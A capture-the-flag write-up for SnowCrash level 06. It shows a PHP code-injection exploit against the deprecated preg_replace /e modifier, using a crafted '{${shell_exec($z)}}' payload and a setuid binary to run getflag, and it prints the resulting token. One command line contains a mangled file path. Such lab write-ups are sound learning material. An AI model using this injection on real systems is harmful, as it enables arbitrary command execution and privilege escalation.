# Level 06

When logging in to level 06, we can find two files in our home directory, a php file and a binary with the same name, both owned by `flag06`

```bash
level06@SnowCrash:~$ ls -lA
total 24
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
```

```php
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

At the first look, we can see the php script takes 2 command-line arguments, opens a file with the 1st one, makes some regex replacements on the content of the file, but the 2nd variable is unused

After experimenting with the binary with various arguments, we can see we get the same output whether we use the binary file or the php script.

### Exploit

This was a tricky one and needed a lot of documentation, when looking for the usage of the `/e` regex modifier, I found it was deprecated since a long time and the version of php on the machine was outdated

- https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier
- https://stackoverflow.com/questions/19245205/replace-deprecated-preg-replace-e-with-preg-replace-callback

```bash
level06@SnowCrash:~$ php --version
PHP 5.3.10-1ubuntu3.19 with Suhosin-Patch (cli) (built: Jul  2 2015 15:05:54)
Copyright (c) 1997-2012 The PHP Group
Zend Engine v2.3.0, Copyright (c) 1998-2012 Zend Technologies
```

When learning about the vulnerabilites of this modifier, I found some examples of exploitation of it:

- https://security.stackexchange.com/questions/151142/understanding-preg-replace-filtering-exploitation
- http://www.madirish.net/402
- https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace
- https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#argument-injection

To exploit it we firstly needed a text file which would be read by the binary, saved in the `$a` variable

```bash
level06@SnowCrash:~$ mktemp
/tmp/tmp.kiGPcYouaI

level06@SnowCrash:~$ chmod 777 /tmp/tmp.kiGPcYouaI
```

After some documentation about how to execute functions stocked in strings in php

- https://www.php.net/manual/fr/language.types.string.php

```bash
level06@SnowCrash:~$ echo '[x {${shell_exec($z)}}}]' > /tmp/tmp.kiGPcYouaI.1
level06@SnowCrash:~$ echo 'getflag' > /tmp/tmp.kiGPcYouaI.2

level06@SnowCrash:~$ ./level06 /tmp/tmp.kiGPcYouaI.1 $(cat /tmp/tmp.kiGPcp/tmp.kiGPcYouaI.2)
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
}
```
